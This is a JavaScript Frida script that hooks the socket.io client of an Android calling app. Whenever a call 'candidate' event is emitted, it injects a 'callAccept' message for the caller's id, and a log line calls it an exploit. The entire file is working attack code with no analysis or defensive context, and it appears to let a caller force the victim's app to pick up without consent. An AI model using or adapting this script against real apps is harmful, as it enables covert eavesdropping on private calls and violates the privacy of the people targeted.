var Color = {
    RESET: "\x1b[39;49;00m", Black: "0;01", Blue: "4;01", Cyan: "6;01", Gray: "7;11", Green: "2;01", Purple: "5;01", Red: "1;01", Yellow: "3;01",
    Light: {
        Black: "0;11", Blue: "4;11", Cyan: "6;11", Gray: "7;01", Green: "2;11", Purple: "5;11", Red: "1;11", Yellow: "3;11"
    }
};

var LOG = function (input, kwargs) {
    kwargs = kwargs || {};
    var logLevel = kwargs['l'] || 'log', colorPrefix = '\x1b[3', colorSuffix = 'm';
    if (typeof input === 'object')
        input = JSON.stringify(input, null, kwargs['i'] ? 2 : null);
    if (kwargs['c'])
        input = colorPrefix + kwargs['c'] + colorSuffix + input + Color.RESET;
    console[logLevel](input);
};

Java.perform(function () {
    var socket = Java.use('io.socket.client.Socket');
    LOG("\n[*] Start call and wait for exploiting!", { c: Color.Cyan });

    socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').implementation = function(x, y){
        // console.log("Socket ===> x: ", x, typeof(x))
        // console.log("Socket ===> y: ", y, typeof(y), JSON.stringify(y))
        if (x == "candidate") {
            var id = JSON.parse(y[0]).fromId;

            console.log("send call-accept");
            socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').call(this, "callAccept", [id])
        }
        return socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').call(this, x, y);
    }
});
